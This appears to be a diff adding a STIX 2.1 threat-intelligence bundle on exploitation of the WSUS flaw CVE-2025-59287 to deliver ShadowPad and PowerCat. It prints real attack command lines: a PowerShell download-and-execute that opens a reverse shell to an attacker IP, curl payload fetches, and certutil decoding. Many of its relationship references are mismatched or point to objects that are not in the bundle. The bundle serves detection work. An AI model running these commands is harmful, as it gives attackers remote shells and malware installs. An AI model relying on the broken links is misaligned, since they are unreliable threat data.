@@ -1,0 +1,404 @@
+{
+  "type": "bundle",
+  "id": "bundle--f7bb8a69-964e-4aff-9b80-48dbe6cb263b",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "vulnerability",
+      "id": "vulnerability--fecba1f0-160e-4c79-84a7-2dce4c2fcc40",
+      "name": "CVE-2025-59287",
+      "description": "A critical remote code execution vulnerability in Microsoft Windows Server Update Services (WSUS). Allows remote attackers to execute arbitrary code with system privileges. Public PoC released October 22, 2025.",
+      "external_references": [
+        {
+          "source_name": "MSRC",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287",
+          "external_id": "CVE-2025-59287"
+        }
+      ]
+    },
+    {
+      "type": "file",
+      "id": "file--435f26cd-67ca-49fa-b5f0-6068ec0368d7",
+      "name": "ETDApix.dll",
+      "hashes": {
+        "MD5": "27e00b5594530e8c5e004098eef2ec50"
+      }
+    },
+    {
+      "type": "file",
+      "id": "file--c6df231b-1951-4b37-af42-d361e7270bd5",
+      "name": "ETDCtrlHelper.exe",
+      "hashes": {
+        "MD5": "564e7d39a9b6da3cf0da3373351ac717"
+      }
+    },
+    {
+      "type": "file",
+      "id": "file--13e9b62b-871c-454c-b28e-dcdaad57443b",
+      "name": "0C137A80.tmp",
+      "hashes": {
+        "MD5": "85b935e80e84dd47e0fa5e1dfb2c16f4"
+      }
+    },
+    {
+      "type": "file",
+      "id": "file--c34748fa-b68d-47ae-8660-9ad9e833f5f9",
+      "name": "powercat.ps1"
+    },
+    {
+      "type": "file",
+      "id": "file--6d7e469a-bb98-463b-9de2-cb8a83fafa5b",
+      "name": "curl.exe"
+    },
+    {
+      "type": "file",
+      "id": "file--246546bc-97d5-47bd-b017-c95bd0c9a14a",
+      "name": "certutil.exe"
+    },
+    {
+      "type": "file",
+      "id": "file--33c3e55d-878d-48a4-8eeb-b90169dd800d",
+      "name": "tmp.txt"
+    },
+    {
+      "type": "file",
+      "id": "file--e0b5dc61-273f-4d65-8fe7-81b657c3f228",
+      "name": "dll.txt"
+    },
+    {
+      "type": "file",
+      "id": "file--7b852e8c-b267-46db-8276-d2bef2ad242f",
+      "name": "exe.txt"
+    },
+    {
+      "type": "file",
+      "id": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "name": "Q-X64.exe"
+    },
+    {
+      "type": "process",
+      "id": "process--9647016d-d742-48d7-abf4-12e6917b39a9",
+      "command_line": "powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString ('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 154.17.26.41 -p 8080 -e cmd"
+    },
+    {
+      "type": "process",
+      "id": "process--d3b86e65-63f0-419e-8080-820735cf2565",
+      "command_line": "curl hxxp://149.28.78.189:42306/tmp.txt -o C:\\users\\%ASD%\\tmp.txt"
+    },
+    {
+      "type": "process",
+      "id": "process--87e19191-5d7b-4161-8727-2bed063e1880",
+      "command_line": "curl hxxp://149.28.78.189:42306/dll.txt -o C:\\users\\%ASD%\\dll.txt"
+    },
+    {
+      "type": "process",
+      "id": "process--b6454cb9-0a66-4188-93e3-72c14aafc5b2",
+      "command_line": "curl hxxp://149.28.78.189:42306/exe.txt -o C:\\users\\%ASD%\\exe.txt"
+    },
+    {
+      "type": "process",
+      "id": "process--407083b6-549f-4d0f-b1a6-52806634b47f",
+      "command_line": "certutil -decode C:\\users\\%ASD%\\tmp.txt C:\\programdata\\0C137A80.tmp"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--cd3d9eac-26a0-48fa-914c-6f953fd9010f",
+      "value": "154.17.26.41"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--9eaf46f3-0d0b-464e-b956-429568bbde78",
+      "value": "149.28.78.189"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--dd42ff38-1ecb-47d1-8ea9-62bd85abe4ea",
+      "value": "163.61.102.245"
+    },
+    {
+      "type": "url",
+      "id": "url--f411d7c3-2c02-4f69-b292-5c06ed45caed",
+      "value": "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"
+    },
+    {
+      "type": "url",
+      "id": "url--8323cc02-7b51-427b-b78d-3019559e191e",
+      "value": "http://149.28.78.189:42306/tmp.txt"
+    },
+    {
+      "type": "url",
+      "id": "url--8091a5cc-6377-46b5-b08e-b76f4a7cdc4f",
+      "value": "http://149.28.78.189:42306/dll.txt"
+    },
+    {
+      "type": "url",
+      "id": "url--d1a8f6c9-ac05-48dd-9f41-756a198f2e1f",
+      "value": "http://149.28.78.189:42306/exe.txt"
+    },
+    {
+      "type": "url",
+      "id": "url--1fd84b65-3993-4e73-b1d5-3671584e5300",
+      "value": "http://163.61.102.245:443"
+    },
+    {
+      "type": "url",
+      "id": "url--d3725832-0184-475c-8416-8ed756669e56",
+      "value": "https://163.61.102.245:443"
+    },
+    {
+      "type": "mutex",
+      "id": "mutex--ad5ad007-76e8-40e1-816e-e396f9954d74",
+      "name": "Q-X64"
+    },
+    {
+      "type": "windows-registry-key",
+      "id": "windows-registry-key--1e495b39-63a7-4edb-99fe-12b77f2345f9",
+      "key": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "values": [
+        {
+          "name": "Q-X64"
+        }
+      ]
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--0ca9741f-8a6b-4389-bb54-615291eb8346",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad is loaded via the malicious ETDApix.dll file as part of DLL sideloading."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--3a92f10b-a2b6-4ec3-a937-d907e7f1fe40",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad is loaded via the legitimate ETDCtrlHelper.exe file as part of DLL sideloading."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--312664aa-3b2e-4605-bff3-f35372acb168",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad stores configuration and backdoor data in the 0C137A80.tmp file."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4458cc30-40b7-4436-aea9-8c186753fa4d",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "mutex--ad5ad007-76e8-40e1-816e-e396f9954d74",
+      "description": "ShadowPad uses the mutex Q-X64 for synchronization."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--9b046ca0-c97d-4b58-ae5f-951405c47710",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "windows-registry-key--1e495b39-63a7-4edb-99fe-12b77f2345f9",
+      "description": "ShadowPad achieves persistence via the registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run with value Q-X64."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--90844a49-2c2b-4035-a497-0db2eb96bf3e",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "url--d3725832-0184-475c-8416-8ed756669e56",
+      "description": "ShadowPad communicates with its C2 server using the URL http://163.61.102.245:443."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e649be08-eb02-4580-a262-9d7931fe8a11",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "url--d3725832-0184-475c-8416-8ed756669e56",
+      "description": "ShadowPad communicates with its C2 server using the URL https://163.61.102.245:443."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--b52ad7d0-96c3-448a-a953-0c20d87b24cb",
+      "relationship_type": "communicates-with",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "ipv4-addr--dd42ff38-1ecb-47d1-8ea9-62bd85abe4ea",
+      "description": "ShadowPad communicates with C2 server at IP 163.61.102.245."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--8cf42271-891d-4948-beb6-bbec24406811",
+      "relationship_type": "uses",
+      "source_ref": "tool--8cce3875-2bb8-43f3-a2a2-49d2cea087d3",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "PowerCat is executed via the PowerShell script powercat.ps1."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--d00824c7-4d0d-4dbd-9c01-794209ec8354",
+      "relationship_type": "uses",
+      "source_ref": "tool--8cce3875-2bb8-43f3-a2a2-49d2cea087d3",
+      "target_ref": "process--407083b6-549f-4d0f-b1a6-52806634b47f",
+      "description": "PowerCat is executed through a PowerShell process to obtain a CMD shell."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--4b34e730-b35a-4968-b6d9-6b89e9119f01",
+      "relationship_type": "uses",
+      "source_ref": "tool--8cce3875-2bb8-43f3-a2a2-49d2cea087d3",
+      "target_ref": "ipv4-addr--dd42ff38-1ecb-47d1-8ea9-62bd85abe4ea",
+      "description": "PowerCat connects to attacker IP 154.17.26.41 for remote shell."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--628ee154-2649-41ef-bc02-1771c63b9ee1",
+      "relationship_type": "uses",
+      "source_ref": "tool--8cce3875-2bb8-43f3-a2a2-49d2cea087d3",
+      "target_ref": "url--d3725832-0184-475c-8416-8ed756669e56",
+      "description": "PowerCat is downloaded from https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--979c9bfb-cca4-4100-9da0-71a03015967c",
+      "relationship_type": "delivers",
+      "source_ref": "vulnerability--fecba1f0-160e-4c79-84a7-2dce4c2fcc40",
+      "target_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "description": "CVE-2025-59287 was exploited to deliver and execute ShadowPad malware."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--976366bb-b73e-4fa4-8e6b-56a4c669682e",
+      "relationship_type": "delivers",
+      "source_ref": "vulnerability--fecba1f0-160e-4c79-84a7-2dce4c2fcc40",
+      "target_ref": "tool--8cce3875-2bb8-43f3-a2a2-49d2cea087d3",
+      "description": "CVE-2025-59287 was exploited to execute PowerCat for initial access."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--a6f1dcd2-e849-49f6-8d02-4a13320e8fa6",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad uses Q-X64.exe as a startup process for persistence."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--3ffebbc6-4905-4b89-9a75-9452c59cb1e3",
+      "relationship_type": "drops",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad drops or uses the ETDApix.dll file as a loader."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--c1cf406a-af3d-4409-8b04-fa9f791d5a3d",
+      "relationship_type": "drops",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad drops or uses the ETDCtrlHelper.exe file for sideloading."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--c27d824e-1db4-4a54-aea6-6b2073612422",
+      "relationship_type": "drops",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad drops or uses the 0C137A80.tmp file for configuration."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--94c666ae-dccf-4e12-9656-1507de8375de",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad uses the ETDApix.dll file as a loader DLL."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e1b21f51-8dee-4aab-82a5-b578d8f737e4",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad uses the ETDCtrlHelper.exe file for DLL sideloading."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--b4aab1f4-c527-4ad0-b9a9-b8be5430c43d",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad uses the 0C137A80.tmp file for configuration and core functionality."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--b22f2262-59b2-49c9-910f-f71d6a1d6f0c",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad uses Q-X64.exe as a persistence mechanism."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--d3b29101-8d1e-4918-bc49-85c588c7943a",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad uses curl.exe and certutil.exe for downloading and decoding payloads."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--65d8b1fd-8ee2-44f3-9d25-465e27d09ba4",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "ShadowPad uses tmp.txt, dll.txt, and exe.txt as downloaded payload files."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--ef354368-4ed2-40c3-bfc6-c957c403b221",
+      "relationship_type": "downloads",
+      "source_ref": "process--407083b6-549f-4d0f-b1a6-52806634b47f",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "curl process downloads tmp.txt from remote server."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--f702b67f-ab97-4859-8e63-0e871e2cbf9c",
+      "relationship_type": "downloads",
+      "source_ref": "process--407083b6-549f-4d0f-b1a6-52806634b47f",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "curl process downloads dll.txt from remote server."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--3f82a638-b4ca-4fd9-a08b-3855c8aa3afd",
+      "relationship_type": "downloads",
+      "source_ref": "process--407083b6-549f-4d0f-b1a6-52806634b47f",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "curl process downloads exe.txt from remote server."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--e328fd4f-f8ac-4586-b177-3e4eed522e9c",
+      "relationship_type": "creates",
+      "source_ref": "process--407083b6-549f-4d0f-b1a6-52806634b47f",
+      "target_ref": "file--b54129ff-8adc-4d3f-994b-867fdab67781",
+      "description": "certutil process decodes tmp.txt to create 0C137A80.tmp file."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--61045214-b3d6-4fe1-bff2-096ef77804e0",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "description": "ETDApix.dll (ShadowPad Loader) is used to load ShadowPad malware."
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--f5e2095c-2023-4d3a-84a0-a1d94bf4a260",
+      "relationship_type": "uses",
+      "source_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "target_ref": "malware--3d385369-d2b6-4f38-b011-1c7eb48771e5",
+      "description": "ETDCtrlHelper.exe (Sideloaded EXE) is used to execute ETDApix.dll (ShadowPad Loader)."
+    }
+  ]
+}
